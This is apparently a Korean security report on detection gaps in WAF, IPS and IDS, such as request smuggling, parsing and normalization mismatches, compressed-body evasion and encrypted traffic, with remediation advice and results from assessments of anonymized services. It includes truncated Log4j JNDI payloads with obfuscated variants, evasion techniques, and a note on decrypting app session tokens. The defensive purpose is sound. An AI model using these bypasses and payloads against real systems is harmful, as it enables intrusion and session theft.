---
title: "보안 장비(WAF/IPS/IDS) 탐지 공백 분석 및 보완 방향"
date: 2026-03-13
draft: false
featured: true
tags: ["Mind", "WAF", "IPS", "IDS", "보안 운영", "탐지 공학", "HTTP 요청 밀수", "보안 우회"]
categories: ["보안 연구", "보안 운영"]
description: "WAF, IPS, IDS의 구조적 탐지 공백을 해석 불일치, TLS 가시성, 검사 범위 한계 관점에서 정리하고 실무 보완 방향을 제시합니다."
image: "/images/pdf-previews/Parsing_Discrepancy_Defense_p1.webp"
---

## 관련 영상

{{< youtube kqTopBJcDv0 >}}

## PDF

- **Open (new tab):** [`/files/Parsing_Discrepancy_Defense.pdf`](/files/Parsing_Discrepancy_Defense.pdf)

<iframe
  id="pdfjs-waf-ips-ids-ko"
  src="/pdfjs/single.html?file=/files/Parsing_Discrepancy_Defense.pdf#page=1"
  width="100%"
  height="560"
  style="border: 1px solid #e5e7eb; border-radius: 8px;"
></iframe>

<script>
  (function () {
    const iframe = document.getElementById("pdfjs-waf-ips-ids-ko");
    if (!iframe) return;
    window.addEventListener("message", function (e) {
      if (e.origin !== window.location.origin) return;
      const data = e.data || {};
      if (data.type !== "pdfjs-resize") return;
      if (typeof data.height !== "number") return;
      iframe.style.height = Math.max(420, Math.min(data.height, 980)) + "px";
    });
  })();
</script>

> PDF가 보이지 않으면 여기로 열어보세요: [`/files/Parsing_Discrepancy_Defense.pdf`](/files/Parsing_Discrepancy_Defense.pdf)

## 재현 스킬

- **GitHub:** [`windshock/waf-ips-ids-retest`](https://github.com/windshock/waf-ips-ids-retest)
- 이 저장소는 본 보고서의 TC 기반 재테스트 시나리오, 가시성 점검, 응답 출처 분류, 증적 생성 절차를 자동화합니다.

## **보안 장비(WAF/IPS/IDS) 탐지 공백 분석 및 보완 방향**

본 보고서는 WAF, IPS, IDS 등 경계 보안 솔루션이 실제 운영 환경에서 직면하는 구조적 탐지 한계를 분석하고, 실무적인 개선 방향을 제시한다. 최근 공격 트렌드는 단순 시그니처 우회를 넘어 보안 장비와 백엔드 서버 간의 **'해석 불일치(Parsing Discrepancy)'**를 악용하는 방향으로 고도화되고 있다. 특히 2025년 PortSwigger 연구는 HTTP/1.1 상의 요청 경계 모호성이 여전히 광범위하게 남아 있다고 보고했고, WAFFLED는 주요 WAF와 프레임워크 조합에서 구조적 파싱 차이로 **1,207개의 고유 우회**를 확인했다. 또한 공개 사고 사례는 탐지 실패가 우회 페이로드 자체보다 **정규화 불일치, TLS 가시성 상실, 센서 장애/과부하** 같은 운영 의존성에서 더 크게 발생함을 보여준다.

핵심 원인은 **payload 자체의 변형**보다 **WAF–프록시–캐시–앱 프레임워크 간 해석 불일치**에 있다. 구체적으로는 (1) 검사 엔진이 올바른 parser branch를 선택하지 못하는 경우, (2) body/header 크기 제한으로 일부만 검사하는 경우, (3) 보안 판단 시점과 실제 실행 시점 사이에 의미가 변형되는 경우, (4) 중간 계층(CDN/캐시/프록시)과 후단(오리진)의 정규화 차이, (5) 요청 경계 자체가 서로 다르게 계산되는 경우로 분류할 수 있다. 따라서 단순 시그니처 기반 탐지에 의존하기보다, **inspection state machine 자체의 보강**(검사 진입 조건, 검사 범위 정책, 정규화 순서, 파싱 기반 분석, 후단 행위 연계)이 필요하다.

---

## **1. 탐지 공백 유형별 상세 분석 (CVE/연구 기반)**

| 구분 | 탐지 필드 | 대표 사례 (CVE/연구) | 현재 한계 | 예상 영향 | 개선 필요 사항 |
| :---- | :---- | :---- | :---- | :---- | :---- |
| **프로토콜 비동기화 (HRS)** | Content-Length Transfer-Encoding | James Kettle (2025) [1][2] | 프런트엔드와 백엔드 서버 간 HTTP 헤더 해석 우선순위 차이로 요청 경계 인식 불일치 발생 | WAF 검증을 통과한 정상 요청 내에 악성 요청을 은닉하여 ACL 우회 및 세션 하이재킹 유발 | HTTP/2 전환, 비표준 헤더 및 파서 불일치 유발 패턴 차단, 요청 정규화 도구 도입 |
| **0.CL 데싱크** | Content-Length | James Kettle (2025) [2] | 프런트엔드가 Content-Length를 0으로 무시하나 백엔드가 처리하여 데드락 우회로 요청 밀수 성립 | 데드락 우회로 WAF 블로킹에도 통과 (e.g., EXNESS $7,500 바운티) | 초기 응답 가젯(/con 리디렉트) 차단, Content-Length 0 엄격 처리 (AWS ALB strict mode 등) |
| **HTTP/2 다운그레이드 데싱크** | Protocol Version / Headers | PortSwigger Research (2025) [2] | HTTP/2를 HTTP/1.1로 다운그레이드 시 헤더 파싱 차이 발생 (e.g., H2.0 데싱크) | Cloudflare 같은 CDN에서 24M 웹사이트 노출, 요청 밀수로 세션 하이재킹 | HTTP/2 end-to-end 적용, 다운그레이드 제한, 업스트림 헤더 연결 금지 |
| **Expect 기반 데싱크** | Expect Header | CVE-2025-32094 (Akamai/Netlify, 2025) [8] | 난독화된 Expect 헤더 (e.g., "Expect: y 100-continue")로 파서 불일치 유발 | RQP(Response Queue Poisoning)로 내부 헤더 노출 ($221,000 바운티) | Expect 헤더 다중값·비표준 형식 차단, HTTP Request Smuggler 스캔 정례화 |
| **파라미터 폴루션 (HPP)** | URL Query POST Body | CVE-2018-14773 (Drupal/Symfony), CVE-2025-7783 [9] | 동일 이름의 파라미터 중복 시 서버 환경에 따른 처리 방식 상이. 2025년에는 JSON/배열 형식으로 확장 | WAF는 특정 파라미터만 검사하나 백엔드에서 악성 페이로드가 결합되어 실행 | 중복 파라미터 차단 정책 적용, 백엔드 기술 스택과 동기화된 파싱 로직 적용 |
| **경로 정규화 불일치** | REQUEST\_URI | CVE-2025-66490 (Traefik) [4], CVE-2025-3454 (Grafana) [3], CVE-2025-55752 (Tomcat), CVE-2025-27210 (Node.js) | 디코딩/정규화 수행 전 단계에서 보안 룰을 평가한 후, 정규화된 값을 백엔드로 전달하는 구조적 결함 | 인코딩된 슬래시(%2F)나 중복 슬래시 등 경로 조작으로 관리자 페이지 접근 통제 우회 | 정규화 완료 후 라우팅 및 보안 규칙 재평가, 비표준 URL 인코딩 패턴 선제적 차단 |
| **검사 모드 선택 공백** | Content-Type / Boundary / Charset | WAFFLED (2025) [5] | Content-Type 제거·변형, charset/parameter 이상치, boundary 조작 시 WAF가 올바른 parser branch를 선택하지 못함 | 룰이 정확해도 검사 엔진이 해당 파서로 진입하지 못하면 무력화. 1,207개 고유 우회 중 90%가 실서비스에서 재현 | Content-Type 비정상 시 보수적 차단/격리, parser failure 시 기본 동작을 MATCH로 설정, RFC 표준 준수 검증 |
| **검사 범위 초과/절삭** | Request Body / Headers / Cookies | AWS WAF 공식 문서 [10][11] | Body·Header·Cookie에 검사 크기 제한 존재. 한도 초과 시 앞부분만 검사하거나 검사 자체를 생략. Content-Encoding 복원 없이 raw 매칭 수행 시 압축 body 전체가 검사 사각지대(실증 확인: 섹션 4-3) | 대용량 JSON 배열, 멀티파트 업로드, 긴 Header 체인에서 페이로드를 검사 한도 이후에 배치하면 탐지 불가. 압축 body 내 공격 구문도 미탐지 | Oversize handling을 MATCH(차단)으로 설정, body inspection size limit 상향, 한도 초과 요청에 대한 별도 로깅, Content-Encoding 복원(decompress) 후 검사 활성화 |
| **JSON 검사 파이프라인 공백** | JSON Body | AWS WAF Bypass 사례 [6], AWS WAF JSON 문서 [11] | JSON 유니코드 이스케이프 미디코딩, invalid JSON fallback 동작(EVALUATE_AS_STRING, MATCH, NO_MATCH), 첫 parsing failure까지만 평가 | 가상 패칭 무력화, SQLi·XSS 페이로드 전달. "JSON inspection 활성화"만으로는 부족하며 fallback·partial parse·oversize 정책까지 확인 필요 | JSON 파서 수준 전체 디코딩, fallback을 MATCH로 설정, invalid JSON 요청 로깅, oversize JSON 차단 정책 수립 |
| **의미 재해석 공백 (라우팅 전/후 재평가 누락)** | X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override, x-middleware-subrequest | CVE-2025-29927 (Next.js), OWASP WSTG [12], Google ESPv2 [13] | 보안 판단은 원래 경로/원래 메서드로 했는데, 실제 실행은 override 헤더가 반영된 컨텍스트로 일어남. Method Override(POST→PUT/DELETE)도 동일 구조 | WAF는 POST로 보고 통과시켰으나 앱은 DELETE로 실행. 정상 경로로 인식하나 내부 관리 기능 실행 | URL·Method Override 헤더 edge에서 무조건 제거, 신뢰 헤더 화이트리스트 운영, 라우팅 결정 이후 보안 룰 재평가 |
| **중간 계층-후단 정규화 공백** | URL Path / Delimiter / Cache Key | PortSwigger Web Cache Deception (2025) [14] | CDN/캐시 서버와 오리진 서버가 경로·구분자·path mapping을 다르게 해석하여 동적 응답이 정적 리소스처럼 캐시됨 | 인증된 사용자의 민감한 응답이 공개 캐시에 저장되어 세션 토큰·개인정보 유출 | Cache key와 오리진 라우팅의 정규화 일관성 검증, edge-origin 간 delimiter 처리 정책 통일 |
| **유니코드 시각적 유사 문자** | Request Body / Headers | Ryan Barnett & Angel Hacker (2025) [15] | 정규화 이전 검사로 dotless ı→I, Kelvin sign→K 등 시각적 유사 문자 변형 탐지 실패 | OWASP Top-10 WAF 룰 무효화 | 모든 유니코드 변형에 대한 Normalize-then-Inspect 적용, NFC/NFKC 정규화 의무화 |
| **암호화/커스텀 가시성 부족** | Encrypted Payload | DeepSeek iOS 앱 사례 [7] | 네트워크 장비가 복호화할 수 없는 TLS 1.3 또는 자체 암호화 적용 구간 발생 | 보안 장비의 페이로드 가시성이 상실되어 데이터 유출 및 C2 통신 등 포착 불가 | TLS 종료 지점 이후 L7 검사, 서버 측 RASP 연계 |

---

## **2. 구조적 탐지 공백 유형 정리**

아래 표는 개별 우회 기법이 아니라, 현재 탐지 체계에서 발생 가능한 **구조적 공백의 근본 원인**을 유형별로 정리한 것이다. 실무 우선순위는 **프로토콜 경계 → 의미 재해석 → 검사 범위 → 검사 모드 선택 → 구조적 데이터 조작** 순이다. HRS와 라우팅/헤더 override는 인증·ACL 우회로 즉시 연결되고, oversize와 parsing discrepancy는 대다수 API 환경에서 재현성이 높기 때문이다.

| 구분 | 탐지 필드 | 현재 한계 | 설명 | 보완 필요 사항 |
| :---- | :---- | :---- | :---- | :---- |
| **프로토콜 경계 공백** | Content-Length / Transfer-Encoding / Protocol Version | 요청 경계 자체가 프런트엔드와 백엔드에서 다르게 계산됨 | HRS/desync, HTTP/2 다운그레이드, 0.CL 공격, Expect 헤더 변형 등. 요청 경계가 엇갈리면 한 요청 안에 다른 요청을 은닉 가능 | HTTP/2 end-to-end 적용, 데싱크 스캐너 정례 운용, 비표준 헤더 조합 차단 |
| **검사 모드 선택 공백** | Content-Type / Boundary / Charset | Content-Type 제거·변형, charset 이상치, boundary 조작 시 WAF가 올바른 parser branch를 선택하지 못함 | 룰이 맞아도 검사 엔진이 올바른 parser branch를 선택하지 못하면 무력화됨. WAFFLED는 이 유형으로 1,207개 고유 우회 확인 | Content-Type 비정상 시 보수적 차단/격리, parser failure 시 기본 동작을 MATCH(차단)로 설정, HTTP-Normalizer 프록시 검토 |
| **검사 범위 공백** | Request Body / Headers / Cookies | Body·Header·Cookie에 검사 크기 제한 존재. 한도 초과 시 앞부분만 검사하거나 생략. Content-Encoding(gzip/deflate/br) 복원 없이 raw 매칭 시 압축 body 내 공격 구문 미탐지 | 대용량 업로드 API, 멀티파트, 긴 JSON 배열을 쓰는 서비스에서 우선 점검 필요. JSON parsing 실패 시 fallback 동작(EVALUATE_AS_STRING, MATCH, NO_MATCH)도 이 범주. 압축 body 우회는 실증 확인됨(섹션 4-3 발견 1) | Oversize handling을 MATCH로 설정, body inspection size limit 상향, invalid JSON fallback 정책 명시, 한도 초과 요청 로깅, Content-Encoding 복원 후 검사 활성화 |
| **인코딩·정규화·문자열 변형** | Request Header / Body | 정규화 이전 값 기준 탐지 시 최종 처리값과 불일치. 단순 키워드 기반 룰은 변형에 취약 | Double Encoding, Overlong UTF-8, 유니코드 시각적 유사 문자(dotless ı→I, Kelvin sign→K), 헥스 인코딩, Case Variation, 치환 함수 중첩 등 | 애플리케이션과 동일 수준의 정규화 및 반복 디코딩, NFC/NFKC 유니코드 정규화, 고정 키워드 외 구조 기반 탐지 확대 |
| **구조적 데이터 조작** | URL / Header / Query / Body | 동일 파라미터 반복, Multipart 구조 변화, JSON 구조 변형에 대한 해석 불일치 | 프록시·보안 장비·백엔드가 같은 요청을 다르게 해석하면 탐지와 실제 처리 결과가 달라짐. HPP의 JSON/배열 형식 확장(CVE-2025-7783) 포함 | 파라미터 중복 처리 정책 통일, Multipart boundary RFC 준수 검증, 프록시-백엔드 해석 일관성 검증 |
| **의미 재해석 공백** | Override Headers / URL Path / HTTP Method | 보안 판단은 원래 경로·메서드로 했는데, 실제 실행은 정규화된 경로나 override 헤더가 반영된 컨텍스트로 일어남 | X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override, x-middleware-subrequest, path normalization bypass를 하나의 통제군으로 관리해야 함 | 외부에서 들어온 override 헤더를 edge에서 무조건 제거, 라우팅 결정 이후 보안 룰 재평가 |
| **중간 계층-후단 정규화 공백** | URL Path / Delimiter / Cache Key | CDN/캐시/프록시와 오리진이 경로·구분자를 다르게 해석 | Web Cache Deception처럼 동적 응답이 정적 리소스로 캐시되어 민감 정보 유출. WAF가 edge에 있고 앱 라우팅은 origin이 맡는 구조에서 발생 | Cache key-오리진 라우팅 정규화 일관성 검증, delimiter 처리 정책 edge-origin 통일 |
| **애플리케이션 내부 치환 / Lookup 처리** | Any Field | 입력값의 최종 의미가 서버 내부에서만 완성됨. 중첩 표현·기본값 처리에 대한 탐지 부족 | 단순 문자열 매칭으로는 서버 내부 치환·결합·Lookup 해석 이후 형성되는 위험 문자열을 포착하기 어려움. `${...}` 구조 자체를 위험 징후로 점검 | 템플릿·Lookup 구조 자체를 위험 징후로 등록, 치환 이후 상태 검증, 후단 행위 기반 탐지 보완 |
| **암복호화 구간** | Encrypted / Custom Payload | 네트워크 장비의 payload 가시성 상실 | HTTPS 또는 자체 암복호화 구간에서는 경계형 장비가 요청 내용을 직접 확인하기 어려움 | TLS 종료 이후 검사, SSL Mirror 구성, 복호화 직후 서버 측 검증·로그 수집 |
| **후단 행위 통제 부족** | Server Outbound / Runtime | 입력 탐지 실패 시 서버 측 악성 행위로 이어질 가능성 | 요청 자체보다 서버의 외부 통신, 예외 처리, 런타임 동작이 더 중요한 징후가 될 수 있음 | Egress Filtering, 감사 로그, EDR/RASP 연계 강화 |

---

## **3. IDS/IPS 룰 보완 방안**

현재 IDS/IPS의 룰이 Header 기준이거나 Raw 바이트 매칭 위주인 경우, 아래와 같은 보완이 필요하다. 기존의 "정규화 강화"와 "Generic Pattern"에 더해 **검사 진입 조건 통제**와 **검사 범위 정책**을 별도 축으로 추가해야 한다. 이는 룰 보강이 아니라 **inspection state machine 보강**에 해당한다.

### **3.1 Normalization(정규화) 강화**

보안 장비가 페이로드를 검사하기 전, 모든 인코딩(URL, Unicode, Base64, Hex 등)을 최종 애플리케이션과 동일한 수준으로 디코딩한 후 패턴을 매칭해야 한다. 현재 Raw 바이트 기준으로 시그니처를 매칭하는 구조에서는 JSON Unicode Escape(`\u0024\u007b` → `${`), 유니코드 시각적 유사 문자(dotless ı→I), 헥스 인코딩 등의 변형만으로 탐지를 회피할 수 있다. NFC/NFKC 유니코드 정규화까지 포함해야 한다.

### **3.2 Generic Pattern(포괄적 패턴) 적용**

`jndi:ldap` 같은 특정 문자열뿐만 아니라, `${`로 시작해서 `}`로 끝나는 Lookup 구조 자체를 의심 징후로 등록하여 탐지 범위를 넓혀야 한다. 이는 Log4j 계열 취약점에서 중첩 Lookup, Case Variation, Default Value 구문 등 다양한 변형 공격을 포괄적으로 탐지하기 위한 필수 조건이다.

### **3.3 검사 진입 조건 통제 (Inspection Entry Control)**

`Content-Type`이 비정상(제거, 변형, 다중 선언)일 때 무조건 통과시키지 않고 **보수적으로 차단/격리**할지 정책을 수립해야 한다. JSON/Multipart/XML parser failure 시 기본 동작을 `MATCH`(차단)로 설정하여, 파서가 인식하지 못하는 요청이 무검사로 통과하는 것을 방지해야 한다. 외부에서 들어온 override 헤더(`X-HTTP-Method-Override`, `X-Original-URL`, `X-Rewrite-URL`, `x-middleware-subrequest`)는 edge에서 무조건 제거해야 한다. 이때 edge, reverse proxy, origin이 **동일한 canonical form**을 기준으로 판단하도록 strict parsing 정책을 맞추고, HTTP/2를 HTTP/1.1로 다운그레이드하는 구간이 있다면 헤더/바디/요청 경계가 동일하게 전달되는지 별도 검증해야 한다.

### **3.4 검사 범위 정책 (Inspection Scope Policy)**

Body/Header/Cookie의 oversize 임계값을 확인하고, 한도 초과 시 동작을 `MATCH`(차단) 또는 별도 로깅으로 설정해야 한다. body inspection size limit을 넘는 구간은 본질적으로 가시성 사각지대이므로, 대용량 업로드 API·멀티파트 업로드·긴 JSON 배열을 사용하는 서비스에서 우선 점검이 필요하다. Invalid JSON 요청의 fallback 동작, partial parse 범위도 명시적으로 설정해야 한다.

### **3.5 암호화 구간(SSL/TLS) 가시성 확보**

Custom Encrypt나 HTTPS로 보호된 구간은 IDS가 내용을 볼 수 없다. **SSL 가시성 장비(SSL Mirror)**를 통해 복호화된 트래픽을 IDS에 전달하거나, WAF에서 이를 처리하도록 구성해야 한다. 다만 SSL Mirror의 존재 자체로 충분하지 않다. 실제 운영에서는 (1) 어느 지점에서 복호화되는지, (2) 복호화된 body/header가 IDS까지 동일하게 전달되는지, (3) 인증서 만료/정책 오류 시 fail-open으로 무검사 통과하지 않는지, (4) 전체 중요 트래픽 중 몇 %가 실제로 복호화·검사되는지 **coverage SLO**를 가져야 한다. TLS 가시성 장비는 보조 기능이 아니라 Tier-0 운영 대상으로 관리해야 한다.

### **3.6 서버 내부 가시성 확보**

대상 서버처럼 자체 암호화 모듈을 사용하는 경우, 네트워크 하단(L4/L7)에서의 탐지는 한계가 명확하다. 이 경우 서버 내부에서 발생하는 행위를 감시하는 **EDR(Endpoint Detection and Response)**이나 **Runtime Application Self-Protection(RASP)** 도입을 검토하는 것이 가장 확실한 대안이다. 동시에 IDS/IPS 자체의 가용성도 보안 통제의 일부로 관리해야 한다. 센서 재시작, 패킷 드롭, reassembly 한계 도달, 메모리 급증은 곧 탐지 공백으로 이어지므로, 장비 상태·드롭률·복호화 실패율을 별도 모니터링하고 장애 시에도 flow log/endpoint telemetry로 최소 가시성을 유지해야 한다.

### **3.7 응답 출처 분류와 IPS 판정 기준**

운영 현장에서는 `403` 하나만 보고 이를 곧바로 `IPS 차단`으로 해석하는 경우가 많지만, 이는 매우 위험하다. 실제로는 **front nginx/reverse proxy의 공통 차단 페이지**, **upstream 애플리케이션의 JSON 오류 응답**, **진짜 인라인 IPS의 silent drop**이 서로 다른 증상으로 나타난다. 따라서 응답 해석은 최소한 `(1) status line, (2) Server 헤더, (3) Content-Type, (4) 본문 fingerprint 반복 여부, (5) timeout/reset/no-response 여부`를 함께 봐야 한다.

재테스트 과정에서는 Docker 기반 로컬 비교 랩을 구성해 `Suricata inline drop`과 `nginx 403`를 나란히 검증했다. 그 결과 **진짜 인라인 IPS drop은 친절한 `403`보다 `timeout + drop event(eve.json)` 형태로 나타났고**, 공통 HTML `403`은 front proxy/nginx 응답에 더 가까웠다. 따라서 실운영 결과에서도 다음 기준을 유지해야 한다.

- `403` 단독으로는 IPS 차단이라 결론 내리지 않는다.
- 공통 HTML `403`은 우선 `front proxy/nginx 응답`으로 본다.
- `text/json`/`application/json`에 `code`, `message`, `detailMessage`가 포함된 응답은 우선 `upstream app 응답`으로 본다.
- 진짜 IPS 여부는 장비 이벤트, flow log, reset/drop 흔적과 대조해서 확정한다.

### **3.8 Canonicalization / Cache Key 일치성 확보**

Header·Cookie·JSON key가 중복되거나, `Host`/`:authority`/`X-Forwarded-Host`처럼 여러 계층이 서로 다른 라우팅 힌트를 받을 수 있는 구조에서는 **"어떤 값이 최종 채택되었는지"**를 남기는 것이 중요하다. 단순히 요청을 차단하는 것만으로는 충분하지 않고, edge·reverse proxy·origin이 동일한 canonical form을 사용해야 한다. 특히 cache key는 보안 판단 기준과 분리되면 poisoning이나 unkeyed input으로 이어질 수 있으므로, cache hit indicator(`Age`, `X-Cache`, `CF-Cache-Status`)와 오리진 라우팅 결과를 함께 점검해야 한다.

### **3.9 Content Decoding / Charset 가시성 확보**

평문 JSON만 검사하고 `gzip`, `deflate`, `br`, BOM, UTF-16 변형을 복원하지 않으면 **복원 후 의미가 달라지는 요청**을 놓치게 된다. 따라서 `Content-Encoding` 복원 여부, charset/BOM 적용 여부, 복원 후 body 길이와 oversize 정책을 함께 관리해야 한다. 운영 관점에서는 "압축 body 허용"과 "복원 후 검사"가 같은 정책으로 묶여야 한다.

> **실증 사례 (2026-03-12, Service-B 대상)**: plaintext HTTP에서 JNDI 문자열을 비압축 body에 넣으면 IPS가 timeout으로 차단했으나, 동일 문자열을 gzip/deflate로 압축하면 302 정상 응답이 반환됨. IPS가 `Content-Encoding`을 해제하지 않고 raw 바이트 매칭만 수행하고 있었음. 대부분의 IPS/WAF는 body decompression 설정을 갖고 있으며(Snort: `decompress_gzip`, Suricata: `decompression.enabled`, Palo Alto: Inspect Compressed Content, Fortinet: Decompress Content), 해당 설정이 비활성 상태였을 가능성이 높다.

### **3.10 Positive Security / OOB 판정 보강**

지속적으로 parser discrepancy가 발견되는 API는 공격 패턴을 계속 늘리기보다 **OpenAPI/Swagger 기반 Positive Security**로 unknown field, type mismatch, additionalProperties, required field 누락을 원천 차단하는 편이 효과적이다. 또한 OOB callback은 보조 증거로만 써야 하며, DNS sinkhole, egress filtering, outbound proxy, resolver log를 함께 보지 않으면 `callback 미수신 = 미실행`으로 오판하기 쉽다.

---

## **4. 실제 사례**

### 4-1. 기존 확인 사례

| 탐지 필드 | 우회 방법 | 설명 | 참고 문서 |
| :---- | :---- | :---- | :---- |
| Request Body | **JSON Unicode Encoding** | API가 JSON 본문을 Gson·Jackson 등 표준 파서로 파싱하는 구조이기 때문에, 공격자가 `"user_id":"\u0024\u007bhostName\u007d-..."`처럼 JSON Unicode 이스케이프로 전송하면 WAF/룰은 raw 바이트 기준 `\u0024\u007b`를 `${`로 매칭하지 못하고, 애플리케이션 파서만 `$`·`{`로 복원하여 인증 백엔드까지 전달한다. 그 결과 백엔드 로그에서 Lookup이 실행된다. 현재 Rule 설정 또한 Header 값을 기준으로 탐지되도록 되어 있으므로 탐지 룰 개선이 필요하다. | 인증 백엔드 서버의 Log4j Lookup 취약점 (JSON Unicode Escape 우회 가능) |
| Request Body | **Custom Encrypt/Decrypt** | 자체 Encrypt 모듈을 사용하여 공격 구문을 암호화하여 대상 서버로 전송하면 보안관제에서 공격 여부 탐지가 불가능하다. | 대상 한정 |

### 4-2. 점검 결과 (2026-03-10~11, service-a.example.com 대상 155건)

**점검 대상**: www.service-a.example.com (Next.js/nginx), member.service-a.example.com (Apache), msg.service-a.example.com (nginx/Internal API)

#### 발견 1: Unicode Escape는 평문 `${` 기반 1차 인라인 차단을 우회

HTTP(80) 트래픽에서 `${` 문자가 포함된 평문 요청은 TCP 연결이 강제 종료되거나 타임아웃(000)으로 종료되었다. 반면 Unicode Escape(`\u0024\u007b`) 변형은 `403` 응답을 반환했다. 이는 최소한 **평문 `${` 패턴을 직접 차단하는 1차 인라인 제어는 우회했다**는 의미다. 다만 후속 재테스트와 응답 출처 분류 결과, 이 `403`은 **IPS가 생성한 차단 응답**이라기보다 **front nginx/reverse proxy의 공통 거부 페이지일 가능성이 높다.** 따라서 본 결과는 `Unicode Escape가 평문 `${` 시그니처 기반 차단은 우회했지만, 정상 애플리케이션 처리까지 완전히 도달했다고 단정할 수는 없다`로 해석하는 것이 가장 정확하다.

| 페이로드 (msg.service-a.example.com HTTP) | 응답 | 해석 |
| :---- | :---- | :---- |
| `${jndi:ldap://...}` 평문 (Header/Body) | **000 (TCP RST)** | 인라인 장비(IPS/방화벽)가 `${` 패턴 실시간 차단 |
| `\u0024\u007bjndi:ldap://...` Unicode Escape | **403** | 평문 `${` 기반 1차 인라인 차단 우회 성공, 다만 최종 앱 처리까지는 미확정 |
| `${j${::-n}di:...}` Log4j Default Value 변형 | **000 (TCP RST)** | `${` 포함 시 동일 차단 |
| `${JnDi:lDaP://...}` Case Variation | **000 (TCP RST)** | `${` 포함 시 동일 차단 |
| `safe_test` (안전 문자열) | **403** | baseline 거부 경로 존재 |

이는 최소한 **평문 `${` 패턴에 대해서는 별도 인라인 제어가 존재하며, Unicode Escape는 그 1차 제어를 우회할 수 있음**을 보여준다. 다만 `403`만으로는 Unicode Escape가 정상 비즈니스 로직까지 동일하게 처리되었는지, 혹은 앞단 거부 페이지에서 종료되었는지를 구분할 수 없으므로, JSON Unicode 정규화 여부와 최종 처리 여부는 장비 이벤트와 애플리케이션 로그를 함께 대조해야 한다.

후속 재현에서는 사용자가 제공한 실제 iOS 앱 HTTPS 정상 요청(`GET /api/app/metadata`, `GET /api/app/content?ver=2`)을 기준선으로 replay했을 때 모두 `200`이 재현되었다. 같은 헤더/쿠키 계약에서 `Referer: ${jndi:...}` 또는 `Referer: \u0024\u007bjndi:...}`를 추가해도 두 API 모두 응답 코드와 Body hash가 동일하게 유지되었다. 즉, **공유된 실제 앱 계약 기준으로는 header payload 추가가 애플리케이션 정상 처리를 깨지 않았다**고 볼 수 있다. 다만 SSL Mirror 및 관제 이벤트가 없는 상태이므로, 이 결과만으로 WAF/IPS/IDS 우회 성공을 확정할 수는 없다.

#### 발견 2: Raw Socket 비표준 HTTP는 별도 차단 경로로 처리됨

WAFFLED 기법(Content-Type 헤더명 변형, NUL byte 삽입, RFC 2231 boundary 분할 등)을 raw socket으로 13건 전송한 결과, 초기 점검에서는 테스터 IP가 `*.service-a.example.com` 전체에서 차단되었다. 후속 재테스트에서는 같은 계열 요청이 `No response received` 또는 `timeout`으로 처리되었고 즉시 전면 차단까지는 재현되지 않았다. 즉, 비표준 HTTP 트래픽에 대해 **정상 HTTP 응답 경로와 다른 차단/보류 경로**가 존재한다는 해석이 타당하다.

#### 발견 3: HTTPS 구간 IDS 가시성 미확인

Day1 HTTPS 테스트 97건에 대해 SSL Mirror 유무가 확인되지 않아, IDS가 HTTPS 페이로드를 검사할 수 있었는지 불명확하다. SSL Mirror가 없다면 HTTPS 구간 전체가 IDS 가시성 사각지대이며, 이는 보고서 섹션 2의 "암복호화 구간" 공백에 해당한다. 설령 SSL Mirror가 있다고 하더라도 복호화 지점 이후의 body/header가 IDS에 동일하게 전달되는지, HTTP/2가 HTTP/1.1로 변환되는 과정에서 해석 불일치가 없는지까지 확인되어야 실제 가시성이 확보되었다고 볼 수 있다.

#### 발견 4: 앱 자체 암호화 (SEED ECB) — IDS 가시성 부재

Android 앱 분석 결과, 대상 SOI API의 대부분은 **KISA SEED 블록암호(ECB 모드)**로 요청 Body를 암호화하여 `enc={base64}` 형태로 전송한다. 이 구간에서 IDS는 암호화된 데이터만 보게 되므로, 평문 공격 페이로드를 탐지할 수 없다. 일부 API(`app/extra_meta`, `home/v4/blocks` 등)만 미암호화(`crypted=0`)로 전송된다.

후속 재현에서 실제 iOS 앱 계약(`X-App-Agent: app_7.1.2,ios-26.3.1;accept=json; crypted=0/1`, `X-App-Crypted-Sid: [REDACTED]`)으로 `GET /api/app/metadata`, `GET /api/app/content?ver=2`, `POST /api/auth/session(enc=...)`를 replay한 결과 각각 `200` 응답이 재현되었다. 이는 **비암호화 구간(`crypted=0`)과 암호화 구간(`crypted=1`) 모두 실제 모바일 앱 계약을 재현할 수 있고, 정상 200 control도 확보되었음**을 의미한다. 따라서 본 보고서의 암호화 기반 가시성 공백은 단순 추정이 아니라, 실제 앱 트래픽 재현을 통해 다시 확인된 결론으로 보는 것이 타당하다.

추가로 `auth/session`의 `crypted=1` 응답은 `app/extra_meta`에서 획득한 `appmeta` 값을 SEED 키로 사용해 직접 복호화할 수 있었다. 복호화 결과에는 `sessionId`, `createTime`, `expireTime`, `trackId`, `cdmeta`, `publicKey`, `callbackToken`, `appToken` 등 실제 세션 정보가 포함되어 있었다. 즉, **클라이언트는 정상적으로 복호화 가능한 애플리케이션 페이로드를 주고받고 있지만, 네트워크 장비는 해당 구간에서 암호문만 보게 되는 구조**가 실제 샘플로 확인되었다.

#### 발견 5: HRS/Cache Deception 미발견

- TC-07 Smuggler: 3개 도메인 × 60+ Transfer-Encoding 변형에서 CL.TE/TE.CL 취약점 **미발견**
- TC-14 Web Cache Deception: www.service-a.example.com (Next.js 캐시 활성)에서 민감 데이터 캐시 **미발견**

#### 발견 6: interactsh 콜백 0건

모든 JNDI 페이로드에 대해 interactsh 콜백이 수신되지 않았다. 다만 callback 미수신만으로 즉시 "실행되지 않았다"고 단정할 수는 없다. egress filtering, DNS sinkhole, outbound proxy, callback 인프라 세션 종료 같은 환경 변수도 존재한다. 이번 점검에서는 서버 응답(403/404/405)과 조기 차단 정황을 함께 고려할 때, 요청이 애플리케이션 레이어까지 의미 있게 전달되기 전에 거부되었을 가능성이 높다. 따라서 본 결과는 **"외부 callback 증거 미관측"**으로 해석하는 것이 보수적이다. 특히 `403` 자체는 IPS 확정 근거가 아니므로, callback 미수신과 `403`를 조합해 실행 여부를 단정하면 안 된다.

### 4-3. 점검 결과 (2026-03-12, *.service-b.example.com 대상 103건)

**점검 대상**: www.service-b.example.com (공개 웹), appif.service-b.example.com:27000 (앱 API), nxt.service-b.example.com (인증), static.service-b.example.com (정적 자산)
**환경**: SSL 가시성 미확보 (Mode B), IDS/IPS 콘솔 접근 불가

#### 발견 1: 압축된 요청 body가 IPS 검사를 우회함 (TC-18)

plaintext HTTP 경로(`POST http://www.service-b.example.com/action.do`)에서 4-cell 검증 매트릭스를 실행한 결과, IPS가 `Content-Encoding` 압축을 해제하지 않고 raw 바이트 매칭만 수행하고 있음을 확인했다.

| 구분 | 비압축 | gzip | deflate |
| :---- | :---- | :---- | :---- |
| 정상 body | 302 ✅ | 302 ✅ | - |
